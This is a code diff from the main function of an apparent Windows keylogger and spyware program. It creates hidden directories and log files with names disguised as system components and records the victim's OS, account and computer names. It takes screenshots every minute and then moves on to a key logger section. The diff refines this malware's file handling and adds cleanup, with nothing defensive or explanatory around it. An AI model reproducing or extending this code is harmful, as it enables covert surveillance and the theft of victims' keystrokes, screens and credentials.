@@ -7,9 +7,6 @@
 int main() {
 
 #ifdef DEBUG_BUILD
-  std::string path = Stream::GetPath(R"(\Microsoft\SystemService\)");
-  Screen::CaptureScreen(path, "winpst", true, 1000);
-
 #endif
 
 #ifndef DEBUG_BUILD
@@ -31,35 +28,46 @@ int main() {
 
 
   // --------------- FILESYSTEM ------------------ //
-  {
-	std::string path = Stream::GetPath("\\Microsoft\\");
-	encrDir.path = mainDir.path = path;
-  }
+
+  std::string path = Stream::GetPath("\\Microsoft\\");
+  encrDir.folder = mainDir.folder = path;
 
   mainDir.name = "SystemService";
   encrDir.name = "BootSetup";
 
-  Stream::MakeDir(mainDir.path, mainDir.name, FILE_ATTRIBUTE_HIDDEN);
-  Stream::MakeDir(encrDir.path, encrDir.name, FILE_ATTRIBUTE_HIDDEN);
+  mainDir.path = mainDir.folder + mainDir.name;
+  encrDir.path = encrDir.folder + encrDir.name;
 
-  Stream::MakeFile("wnxshl2.sys.log", mainDir.path + mainDir.name);
-  Stream::MakeFile("boothandler.sys.log", mainDir.name);
+  Stream::MakeDir(mainDir.folder, mainDir.name, FILE_ATTRIBUTE_HIDDEN);
+  Stream::MakeDir(encrDir.folder, encrDir.name, FILE_ATTRIBUTE_HIDDEN);
+
+  // FIXME doesnt create the files
+  Stream::MakeFile("wnxshl2.sys.log", mainDir.path); // Logs
+  Stream::MakeFile("boothandler.sys.log", path); // Encryption key
 
 
   // ---------------- LOGFILE -------------------- //
   Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, false);
 
   std::ostringstream ostream;
+
   DWORD major = pClientInfo->osVersionInfo.dwMajorVersion;
   DWORD minor = pClientInfo->osVersionInfo.dwMinorVersion;
   char *acc = pClientInfo->accountName;
   char *com = pClientInfo->computerName;
+
   ostream << "\n[*] OS Info: Major - " << major << "; Minor - " << minor << " [*]"
 		  << "\n[*] Account Info: User -" << acc << "; Computer - " << com << " [*]";
+
+  delete acc;
+  delete com;
+  acc = nullptr;
+  com = nullptr;
+
   std::string write = ostream.str();
   Stream::WriteLog(write, KeyHook::activeProcess, false);
 
-  Screen::CaptureScreen(mainDir.path, "winpst", true, 60000);
+  Screen::CaptureScreen(mainDir.path + "\\", "winpst", true, 60000); // Screenshot
 
 
   // -------------- KEY LOGGER ------------------- //
